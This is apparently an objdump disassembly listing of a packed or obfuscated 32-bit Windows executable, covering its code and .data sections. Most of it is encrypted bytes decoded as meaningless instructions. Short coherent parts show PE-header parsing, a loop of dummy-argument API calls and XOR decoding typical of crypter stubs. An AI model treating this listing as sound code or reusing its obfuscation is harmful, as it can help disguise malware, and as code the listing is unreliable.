  411408:	imul   edi,DWORD PTR [ebp-0x37821a49],0xffffffd1
  41140f:	lahf   
  411410:	ret    
  411411:	pop    ss
  411412:	dec    ebx
  411413:	clc    
  411414:	loop   0x4113af
  411416:	repz fiadd WORD PTR [ebx+0xf856caf]
  41141d:	aas    
  41141e:	dec    BYTE PTR [edx+0x29c3189e]
  411424:	popf   
  411425:	ror    DWORD PTR [edi],0x88
  411428:	mov    ch,0x2b
  41142a:	rcr    esi,0x62
  41142d:	adc    al,0x5
  41142f:	jnp    0x41146c
  411431:	push   ebx
  411432:	mov    edi,0x451988a1
  411437:	push   ss
  411438:	add    esp,DWORD PTR [ecx-0x3cc5ef6a]
  41143e:	xor    al,0x1c
  411440:	loopne 0x411481
  411442:	lahf   
  411443:	dec    ebx
  411444:	sbb    eax,0xa79cdca0
  411449:	pop    es
  41144a:	or     ebx,DWORD PTR [ecx-0x34]
  41144d:	iret   
  41144e:	pop    edi
  41144f:	je     0x411448
  411451:	dec    eax
  411452:	push   ax
  411454:	test   DWORD PTR [ebp+esi*2-0x28],edx
  411458:	sub    edx,DWORD PTR [edi-0x45]
  41145b:	and    DWORD PTR [esi],edx
  41145d:	pop    ds
  41145e:	enter  0xb5e0,0xa0
  411462:	xchg   edx,eax
  411463:	sbb    bh,BYTE PTR [ecx-0xb7fb37a]
  411469:	and    eax,0x93a8b926
  41146e:	retf   0xfe26
  411471:	pop    esp
  411472:	out    0xd1,eax
  411474:	rcl    ch,cl
  411476:	add    BYTE PTR [eax],cl
  411478:	xchg   ecx,eax
  411479:	sbb    eax,0x7abe95f3
  41147e:	nop
  41147f:	jne    0x4114c6
  411481:	(bad)  
  411482:	js     0x41149f
  411484:	sub    cl,BYTE PTR [edx+0x2d]
  411487:	cs pop esi
  411489:	xor    al,0xec
  41148b:	cmc    
  41148c:	or     bl,BYTE PTR [eax-0x33ecc688]
  411492:	jae    0x411505
  411494:	mov    bh,BYTE PTR [esi]
  411496:	adc    ch,dh
  411498:	xchg   esp,eax
  411499:	es mov dh,0xb2
  41149c:	push   esi
  41149d:	int    0xcb
  41149f:	add    edx,DWORD PTR ds:0x573fd582
  4114a5:	sub    ah,BYTE PTR [edx+0x37]
  4114a8:	sti    
  4114a9:	adc    BYTE PTR [esi+0x15],dl
  4114ac:	xor    edi,eax
  4114ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114af:	mov    dl,0x52
  4114b1:	stc    
  4114b2:	xor    eax,0x57760e04
  4114b7:	adc    al,0xaa
  4114b9:	xlat   BYTE PTR ds:[ebx]
  4114ba:	je     0x4114dc
  4114bc:	inc    esi
  4114bd:	dec    esi
  4114be:	sbb    al,0x9e
  4114c0:	test   eax,0xbe2ee4c2
  4114c5:	push   es
  4114c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114c7:	fwait
  4114c8:	sahf   
  4114c9:	dec    edx
  4114ca:	daa    
  4114cb:	repz retf 0xc103
  4114cf:	push   ecx
  4114d0:	adc    DWORD PTR [edx],esi
  4114d2:	pop    esi
  4114d3:	mov    BYTE PTR [ecx-0x4d],bh
  4114d6:	ja     0x41151a
  4114d8:	imul   DWORD PTR [ebp+0x47]
  4114db:	mov    edx,0x2dfd0645
  4114e0:	in     al,dx
  4114e1:	push   edx
  4114e2:	sub    al,0x1b
  4114e4:	or     al,0x67
  4114e6:	push   esi
  4114e7:	mov    bl,0xe3
  4114e9:	jecxz  0x4114b4
  4114eb:	in     al,0x66
  4114ed:	(bad)
  4114f0:	clc    
  4114f1:	xor    DWORD PTR [esi],0x13efd1a
  4114f7:	pop    ds
  4114f8:	xchg   ah,al
  4114fa:	stos   DWORD PTR es:[edi],eax
  4114fb:	cmp    DWORD PTR [esp-0x5a5a4db1],esi
  411502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411503:	sub    al,0x26
  411505:	xor    eax,esi
  411507:	cmp    bl,BYTE PTR [esi+0x14]
  41150a:	in     al,dx
  41150b:	fucomip st,st(6)
  41150d:	or     al,0xc1
  41150f:	add    BYTE PTR [ecx+0x37],cl
  411512:	inc    ebp
  411513:	dec    ecx
  411514:	clc    
  411515:	mov    edx,esi
  411517:	arpl   WORD PTR [ecx+0x16],dx
  41151a:	pop    ebx
  41151b:	aam    0x4f
  41151d:	(bad)  
  41151e:	fbstp  TBYTE PTR [ecx-0x2cb26218]
  411524:	push   ebp
  411525:	and    DWORD PTR [ebx-0x43],esi
  411528:	adc    esp,edi
  41152a:	mov    ebp,DWORD PTR [edx+0x41572176]
  411530:	cmp    dh,BYTE PTR [ecx+0x784fec3f]
  411536:	ins    BYTE PTR es:[edi],dx
  411537:	mov    eax,0xb95ed9f0
  41153c:	add    al,0x97
  41153e:	and    BYTE PTR [edi+0x1452eae3],0x21
  411545:	add    eax,0x9d947f3
  41154a:	jge    0x411579
  41154c:	ret    
  41154d:	jmp    0x411522
  41154f:	fmul   QWORD PTR [edi-0x7e19309e]
  411555:	fstp   QWORD PTR [ebp+0x4d]
  411558:	popf   
  411559:	pop    edx
  41155a:	sub    DWORD PTR [ebp-0x2dd6a4a1],0xfffffff2
  411561:	(bad)  
  411562:	mov    al,ds:0x939d17a4
  411567:	es pop ecx
  411569:	je     0x411575
  41156b:	mov    DWORD PTR [ebp-0xc],esp
  41156e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41156f:	cmc    
  411570:	hlt    
  411571:	shl    BYTE PTR [ebp+0x54829f73],0x46
  411578:	in     eax,0x4a
  41157a:	jmp    0xa568b2f0
  41157f:	call   0x2f021eeb
  411584:	sub    eax,DWORD PTR [ebp+0x29831d5d]
  41158a:	and    DWORD PTR ds:0x75ec49d4,edi
  411590:	inc    edi
  411591:	aas    
  411592:	shr    BYTE PTR [edi+0x4b],cl
  411595:	out    0xef,eax
  411597:	shr    eax,1
  411599:	mov    edx,0x4595d834
  41159e:	cmp    bl,BYTE PTR [ebx-0x66126ddc]
  4115a4:	push   0xe124ee78
  4115a9:	jecxz  0x41162a
  4115ab:	mov    edx,0xf12dc718
  4115b0:	jp     0x4115fc
  4115b2:	mov    eax,ds:0x12cc7485
  4115b7:	adc    ch,BYTE PTR [esi]
  4115b9:	imul   esp,DWORD PTR [ebx+0x21],0x51ecac5c
  4115c0:	mov    al,0x15
  4115c2:	mov    DWORD PTR [esi+0x4f],esi
  4115c5:	or     al,0x80
  4115c7:	jne    0x411632
  4115c9:	add    edi,ebp
  4115cb:	mov    al,0x98
  4115cd:	sub    dh,BYTE PTR [ecx-0x6e]
  4115d0:	pop    ss
  4115d1:	adc    cl,BYTE PTR [esi+0x8558b27]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	cld    
  411619:	in     eax,0xd7
  41161b:	out    0x86,eax
  41161d:	inc    eax
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x41160d
  411625:	mov    eax,ds:0xf49bcf9
  41162a:	jp     0x41165f
  41162c:	cmp    DWORD PTR [ebx-0x413720a8],eax
  411632:	fsubr  DWORD PTR [edi+0x4d]
  411635:	int3   
  411636:	mov    edi,0xf6d63dc7
  41163b:	fisub  WORD PTR [esi]
  41163d:	shl    BYTE PTR [eax+0x57624065],0xfc
  411644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411645:	pop    ds
  411646:	pop    ebp
  411647:	xchg   esp,eax
  411648:	sub    ah,BYTE PTR gs:[edx-0x23d4b9ea]
  41164f:	enter  0xae98,0x2a
  411653:	aaa    
  411654:	(bad)  
  411655:	icebp  
  411656:	push   ebx
  411657:	mov    eax,ds:0xc16bdedb
  41165c:	dec    ebp
  41165d:	mov    al,ds:0x43fc56d7
  411662:	das    
  411663:	nop
  411664:	pop    edx
  411665:	dec    eax
  411666:	xchg   BYTE PTR [ecx],cl
  411668:	loopne 0x411667
  41166a:	adc    ecx,DWORD PTR [ecx]
  41166c:	hlt    
  41166d:	lods   eax,DWORD PTR ds:[esi]
  41166e:	rcl    BYTE PTR [esi],1
  411670:	jne    0x411644
  411672:	jge    0x4116d8
  411674:	mov    bl,0x6a
  411676:	mov    cl,0x30
  411678:	shl    BYTE PTR [edx],0xc9
  41167b:	mov    ss,ebp
  41167d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41167e:	mov    dl,0x2d
  411680:	jb     0x411613
  411682:	mov    bl,0x50
  411684:	cmp    esi,ecx
  411686:	iret   
  411687:	(bad)  
  411688:	outs   dx,DWORD PTR ds:[esi]
  411689:	and    DWORD PTR [edx-0x7bf1fda9],ecx
  41168f:	das    
  411690:	ret    
  411691:	cmp    BYTE PTR [eax],al
  411693:	iret   
  411694:	js     0x411660
  411696:	or     al,0x65
  411698:	stc    
  411699:	xor    DWORD PTR [esi],edx
  41169b:	retf   
  41169c:	(bad)  
  41169d:	cmp    ebp,DWORD PTR ds:0xb5f0f4cb
  4116a3:	(bad)  
  4116a5:	mov    ch,0xd7
  4116a7:	adc    ah,BYTE PTR [ecx-0x47]
  4116aa:	iret   
  4116ab:	inc    ebp
  4116ac:	or     ch,ch
  4116ae:	jmp    0x2b49:0x6efed5c1
  4116b5:	in     al,dx
  4116b6:	xor    edi,0xde314290
  4116bc:	cdq    
  4116bd:	data16 (bad) 
  4116bf:	out    0x9d,eax
  4116c1:	rol    BYTE PTR [ebx+0x7d],1
  4116c4:	cmp    DWORD PTR [esi-0x60c414fa],eax
  4116ca:	inc    eax
  4116cb:	and    eax,0x4f83c7ce
  4116d0:	test   eax,0xabc27dd8
  4116d5:	int    0xd
  4116d7:	pop    ebp
  4116d8:	push   ss
  4116d9:	jmp    0x4116ef
  4116db:	cdq    
  4116dc:	ret    0xe8db
  4116df:	aas    
  4116e0:	outs   dx,DWORD PTR ds:[esi]
  4116e1:	stos   DWORD PTR es:[edi],eax
  4116e2:	cld    
  4116e3:	adc    ecx,eax
  4116e5:	test   al,0x99
  4116e7:	cdq    
  4116e8:	in     al,0x87
  4116ea:	fwait
  4116eb:	test   al,0xd
  4116ed:	mov    DWORD PTR [esi-0x1d],esp
  4116f0:	and    eax,0x37c611df
  4116f5:	leave  
  4116f6:	sti    
  4116f7:	sbb    dl,BYTE PTR [esi+0x7c]
  4116fa:	aas    
  4116fb:	and    BYTE PTR [edx],0x5
  4116fe:	aam    0x90
  411700:	sbb    DWORD PTR [ecx+0x426505bc],edx
  411706:	outs   dx,BYTE PTR ds:[esi]
  411707:	xor    BYTE PTR [esi+0x7a6319ec],dl
  41170d:	sbb    DWORD PTR [ecx-0x549a6f8],ecx
  411713:	pop    ds
  411714:	data16 adc BYTE PTR [ecx],0xc2
  411718:	(bad)  
  411719:	fstp   DWORD PTR [eax-0x73]
  41171c:	sbb    bl,BYTE PTR [eax+0x48]
  41171f:	dec    ecx
  411720:	dec    ebx
  411721:	sub    al,0x55
  411723:	fld    DWORD PTR [ebp-0x5]
  411726:	adc    eax,0xa379a52b
  41172b:	mov    BYTE PTR [ebx],bh
  41172d:	mov    cl,al
  41172f:	sti    
  411730:	pop    esi
  411731:	jno    0x4116e0
  411733:	xchg   edx,eax
  411734:	xchg   ebx,eax
  411735:	pusha  
  411736:	jg     0x4116bc
  411738:	es inc ecx
  41173a:	lds    esp,FWORD PTR [ebp-0x271d40f4]
  411740:	cmp    bl,dl
  411742:	or     al,0xfc
  411744:	ins    DWORD PTR es:[edi],dx
  411745:	mov    dh,0x1
  411747:	call   0x8a1d:0x92f15b60
  41174e:	push   ecx
  41174f:	pusha  
  411750:	popf   
  411751:	sbb    bl,bl
  411753:	ss sub al,0x5b
  411756:	xor    ch,BYTE PTR [ebp-0x6a]
  411759:	in     al,dx
  41175a:	fsub   QWORD PTR [eax]
  41175c:	xchg   edi,eax
  41175d:	popf   
  41175e:	mov    ch,BYTE PTR [ecx+0x26]
  411761:	leave  
  411762:	in     eax,0x8f
  411764:	outs   dx,BYTE PTR ds:[esi]
  411765:	imul   ebp,DWORD PTR [ebx-0x557c0610],0xc7d7d8a6
  41176f:	or     al,0x2
  411771:	in     eax,dx
  411772:	nop
  411773:	in     eax,0xcd
  411775:	cdq    
  411776:	xor    DWORD PTR [ebp-0x1f],ecx
  411779:	ud0    ebp,DWORD PTR [edx-0x328411bf]
  411780:	adc    al,BYTE PTR [edx+0x643ff6f9]
  411786:	push   ds
  411787:	cmc    
  411788:	fbld   TBYTE PTR ds:[edx]
  41178b:	xchg   ebx,eax
  41178c:	jmp    0x41174a
  41178e:	aam    0xd3
  411790:	adc    al,0x46
  411792:	inc    esp
  411793:	lahf   
  411794:	xchg   ebx,eax
  411795:	jnp    0x411723
  411797:	rcr    BYTE PTR [ebx],cl
  411799:	xor    BYTE PTR [edx-0x7b395cd3],ah
  41179f:	add    ah,BYTE PTR [ecx-0x4a]
  4117a2:	inc    edi
  4117a3:	sbb    esp,DWORD PTR [edi]
  4117a5:	sahf   
  4117a6:	xchg   edx,eax
  4117a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117a8:	iret   
  4117a9:	lods   al,BYTE PTR ds:[esi]
  4117aa:	mov    ds:0xecb1a068,al
  4117af:	mov    edi,0x4919d6f2
  4117b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117b5:	fisttp WORD PTR [edx-0x14]
  4117b8:	jb     0x4117af
  4117ba:	or     DWORD PTR [ebx],eax
  4117bc:	les    ebx,FWORD PTR [edi-0x6b37535c]
  4117c2:	fs jg  0x41175a
  4117c5:	jl     0x4117d7
  4117c7:	mov    bh,0x2c
  4117c9:	pop    edi
  4117ca:	scas   al,BYTE PTR es:[edi]
  4117cb:	pop    esi
  4117cc:	rol    BYTE PTR [eax-0x75],1
  4117cf:	inc    ebp
  4117d0:	or     bh,al
  4117d2:	add    eax,0x4336a3
  4117d7:	cmp    eax,0x8a000042
  4117dc:	add    BYTE PTR [ecx+0x4335ff2d],al
  4117e2:	add    BYTE PTR [ebp+0x6d],bh
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43369f,0x433603
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43369f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43361b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4336ab,0x0
  41182f:	mov    eax,ds:0x4336ab
  411834:	inc    eax
  411835:	mov    ds:0x4336ab,eax
  41183a:	cmp    DWORD PTR ds:0x4336ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4337bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4336ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4336ab
  411899:	inc    eax
  41189a:	mov    ds:0x4336ab,eax
  41189f:	cmp    DWORD PTR ds:0x4336ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	sub    eax,DWORD PTR [ebx]
  4118e9:	xchg   edx,eax
  4118ea:	leave  
  4118eb:	sub    al,0x4e
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x41196d
  4118f4:	mov    ch,0xaa
  4118f6:	cmp    ah,BYTE PTR [esp+ecx*1-0x653b8267]
  4118fd:	xor    eax,0x5b8eaa4d
  411902:	mov    bh,BYTE PTR [esi]
  411904:	gs imul esi,ebx,0x8ec5dc60
  41190b:	and    al,0x61
  41190d:	xor    bl,dl
  41190f:	push   eax
  411910:	push   0xd499fbd6
  411915:	adc    al,0x85
  411917:	sub    bl,BYTE PTR [edx+0x58]
  41191a:	or     ecx,edi
  41191c:	sti    
  41191d:	add    al,0x94
  411920:	mov    edx,0x98909777
  411925:	pusha  
  411926:	js     0x4118ea
  411928:	mov    eax,ds:0x2eaacee5
  41192d:	stos   BYTE PTR es:[edi],al
  41192e:	adc    esp,DWORD PTR [edx+0x30]
  411931:	pop    ecx
  411932:	sub    bl,BYTE PTR [esi]
  411934:	inc    ecx
  411935:	inc    esp
  411936:	and    BYTE PTR ds:0x1496eb52,al
  41193c:	dec    eax
  41193d:	fld    QWORD PTR [edi]
  41193f:	mov    bl,0xea
  411941:	push   esi
  411942:	push   eax
  411943:	addr16 jle 0x4119b7
  411946:	ins    BYTE PTR es:[edi],dx
  411947:	jl     0x41191b
  411949:	nop
  41194a:	ja     0x4118e0
  41194c:	iret   
  41194d:	xchg   esi,eax
  41194e:	push   0x69
  411950:	cmp    BYTE PTR [ebp+0x5a4e2b3c],0xb1
  411957:	out    dx,al
  411958:	add    al,0xdd
  41195a:	jmp    0xbd51:0xe9090893
  411961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411962:	cmp    eax,DWORD PTR [ecx+eiz*1-0x6a57aed7]
  411969:	test   al,0xc4
  41196b:	mov    ah,0xdf
  41196d:	mov    edi,cs
  41196f:	dec    ebp
  411970:	repnz mov esi,eax
  411973:	scas   al,BYTE PTR es:[edi]
  411974:	pop    esi
  411975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411976:	inc    edi
  411977:	add    al,0x85
  411979:	leave  
  41197a:	std    
  41197b:	xchg   edx,eax
  41197c:	pop    ds
  41197d:	mov    edx,0x5dd9629f
  411982:	into   
  411983:	mov    edi,0xb3fbd8b4
  411988:	(bad)  
  411989:	in     eax,dx
  41198a:	fimul  WORD PTR [esi-0x1c]
  41198d:	test   edi,esp
  41198f:	adc    BYTE PTR [eax],dl
  411991:	ins    DWORD PTR es:[edi],dx
  411992:	dec    edi
  411993:	in     eax,dx
  411994:	sub    BYTE PTR [edx+0x3e],0x13
  411998:	icebp  
  411999:	jbe    0x411974
  41199b:	mov    cs,esp
  41199d:	push   es
  41199e:	(bad)  
  41199f:	imul   edi,ebx,0x26
  4119a2:	fistp  QWORD PTR [edx+ebp*8]
  4119a5:	ret    
  4119a6:	mov    edx,0x59b87063
  4119ab:	add    al,0xc6
  4119ad:	fistp  DWORD PTR ds:0x32577dba
  4119b3:	pop    edx
  4119b4:	inc    ebx
  4119b5:	out    0x4c,al
  4119b7:	push   cs
  4119b8:	sub    BYTE PTR [edi+ebx*8-0x4724796d],dl
  4119bf:	imul   eax,esi,0x5
  4119c2:	test   dl,dl
  4119c4:	les    ebx,FWORD PTR ds:0xf6f0f9dd
  4119ca:	pop    edx
  4119cb:	push   edi
  4119cc:	xlat   BYTE PTR ds:[ebx]
  4119cd:	test   eax,0xc33f5706
  4119d2:	push   ss
  4119d3:	daa    
  4119d4:	shr    DWORD PTR [esi-0xbe2f706],1
  4119da:	push   esp
  4119db:	push   eax
  4119dc:	out    dx,eax
  4119dd:	out    0x93,eax
  4119df:	push   edx
  4119e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119e1:	mov    ebp,0x786b9ebd
  4119e6:	iret   
  4119e7:	out    0xdb,eax
  4119e9:	jl     0x411a28
  4119eb:	add    bl,BYTE PTR [ebx+eax*8]
  4119ee:	sub    DWORD PTR [edi+0x32],ecx
  4119f1:	mov    ds:0xb7fc10f1,eax
  4119f6:	out    dx,eax
  4119f7:	test   eax,0x8d4aedfd
  4119fc:	in     eax,0x6b
  4119fe:	jmp    0x411a36
  411a00:	retf   0xfc69
  411a03:	je     0x411a34
  411a05:	pop    ecx
  411a06:	ins    DWORD PTR es:[edi],dx
  411a07:	or     BYTE PTR [esp+ebp*8+0x4b],dl
  411a0b:	test   al,0x45
  411a0d:	push   0x38e617aa
  411a12:	cs dec eax
  411a14:	sbb    dl,BYTE PTR [ecx]
  411a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a17:	mov    ah,0xab
  411a19:	sub    edx,DWORD PTR ds:0xb6381135
  411a1f:	dec    esi
  411a20:	hlt    
  411a21:	dec    ebp
  411a22:	pop    es
  411a23:	mov    WORD PTR [eax+ebp*4-0x720c7ed6],es
  411a2a:	xchg   ebx,eax
  411a2b:	outs   dx,DWORD PTR ds:[esi]
  411a2c:	adc    esi,0x68
  411a2f:	xchg   ebx,eax
  411a30:	adc    al,BYTE PTR [edx]
  411a32:	jo     0x411a93
  411a34:	or     DWORD PTR [esi+0x5365a024],esp
  411a3a:	adc    DWORD PTR [ebx],eax
  411a3c:	ins    BYTE PTR es:[edi],dx
  411a3d:	inc    ecx
  411a3e:	pop    edx
  411a3f:	test   BYTE PTR [edx-0x4b],dl
  411a42:	js     0x411a54
  411a44:	sar    BYTE PTR ss:[esi],cl
  411a47:	inc    ebp
  411a48:	xchg   edi,eax
  411a49:	scas   al,BYTE PTR es:[edi]
  411a4a:	pusha  
  411a4b:	test   DWORD PTR [edi-0x6c],ebx
  411a4e:	adc    eax,DWORD PTR [esi-0x3ddda694]
  411a54:	cmp    ecx,ecx
  411a56:	push   ecx
  411a57:	faddp  st(0),st
  411a59:	in     al,0xc5
  411a5b:	cs adc bl,dl
  411a5e:	cld    
  411a5f:	pusha  
  411a60:	or     BYTE PTR [ebx],dh
  411a62:	pop    esi
  411a63:	mov    DWORD PTR [edx-0xa],esi
  411a66:	call   0x53c4284d
  411a6b:	(bad)  
  411a6c:	fmul   st,st(5)
  411a6e:	xor    ah,BYTE PTR [eax+0x59]
  411a71:	mov    edi,0x42bf4c4e
  411a76:	add    bl,BYTE PTR ds:0xeecd446b
  411a7c:	push   ss
  411a7d:	jle    0x411ac4
  411a7f:	adc    BYTE PTR [eax+0x51a263a0],ah
  411a85:	dec    ebp
  411a86:	mov    edx,0x8639d3f2
  411a8b:	mov    eax,0x270c4421
  411a90:	or     BYTE PTR [esi+0x4],0x74
  411a94:	and    bl,BYTE PTR ds:0x69a53857
  411a9a:	icebp  
  411a9b:	or     esp,DWORD PTR [edi+0xde9c103]
  411aa1:	add    BYTE PTR [eax],al
  411aa3:	add    BYTE PTR [ebx+0x5435fc45],cl
  411aa9:	or     BYTE PTR [ecx+0x7],dl
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
